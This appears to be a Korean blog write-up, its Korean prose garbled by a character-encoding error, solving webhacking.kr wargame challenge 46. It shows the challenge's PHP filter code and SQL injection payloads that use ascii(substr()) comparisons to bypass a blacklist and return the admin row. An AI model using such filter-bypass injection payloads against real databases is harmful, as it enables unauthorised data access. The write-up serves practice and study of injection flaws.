---
title: "[webhacking.kr] 46ë²ˆ ë¬¸ì œ í’€ì´[SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "46ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 46ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152758629-e436c787-9272-4a79-ac0f-8e9733e2123b.png)


  ```php
<?php
  if($_GET['lv']){
    $db = dbconnect();
    $_GET['lv'] = addslashes($_GET['lv']);
    $_GET['lv'] = str_replace(" ","",$_GET['lv']);
    $_GET['lv'] = str_replace("/","",$_GET['lv']);
    $_GET['lv'] = str_replace("*","",$_GET['lv']);
    $_GET['lv'] = str_replace("%","",$_GET['lv']);
    if(preg_match("/select|0x|limit|cash/i",$_GET['lv'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select id,cash from chall46 where lv=$_GET[lv]"));
    if($result){
      echo("{$result['id']} information<br><br>money : {$result['cash']}");
      if($result['id'] == "admin") solve(46);
    }
  }
?>
  ```


# ë¬¸ì œ í’€ì´
  45ë²ˆ ë¬¸ì œì™€ ë‹¤ë¥´ê²Œ ì´ë²ˆì—” addslashesë¥¼ ë‹¨ë…ìœ¼ë¡œ ì‚¬ìš©í•˜ê³  ìˆì–´ì„œ ```'``` ì‚¬ìš©ì´ ì–´ë µìŠµë‹ˆë‹¤.

  ìš°ì„  ì¸ì ì…˜ í•´ì•¼ í•˜ëŠ” ì¿¼ë¦¬ë¶€í„° ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```sql
select id,cash from chall46 where lv={}
  ```

  ì¡°ê±´ë¬¸ì— ë“¤ì–´ê°€ëŠ” ë¶€ë¶„ì´ ë¬¸ìì—´ì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— êµ³ì´ ```'```ë¥¼ ì‚¬ìš©í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.

  ì´ë²ˆ ë¬¸ì œëŠ” í•„í„°ë§ ëœë¬¸ìë„ ê±°ì˜ ì—†ê³ , ì œì•½ì‚¬í•­ì´ ê±°ì˜ ì—†ì–´ì„œ ë°©ë²•ì´ ë„ˆë¬´ ë§ì€ë°, ì œê°€ í‘¼ ì¿¼ë¦¬ë¬¸ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```sql
111||ascii(substr(id,1,1))=97
  ```

  ë§¨ ì²«ê¸€ìë§Œ ë¹„êµë¥¼ í•˜ëŠ” ì¿¼ë¦¬ë¬¸ì¸ë° ì²«ê¸€ì ë¹„êµë§Œ í•˜ë‹ˆê¹Œ ë‹¤ìŒê³¼ ê°™ì€ ë°ì´í„°ë„ ì²«ê¸€ìê°€ 'a'ì´ê¸° ë•Œë¬¸ì— í’€ë¦¬ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152761263-b7dc4107-4671-4402-abe7-941d49852201.png)

  ê·¸ë˜ì„œ ë‘ë²ˆì§¸ ê¸€ìê°€ì§€ &&ë¥¼ ë„£ì–´ì„œ ë¹„êµë¥¼ í•´ì£¼ë‹ˆê¹Œ í’€ë ¸ìŠµë‹ˆë‹¤.

  ```sql
111||ascii(substr(id,1,1))=97&&ascii(substr(id,2,1))=100
  ```

  ![image](https://user-images.githubusercontent.com/33647663/152761961-54c06c3f-964c-458c-91ee-dbb7ead96743.png)

  
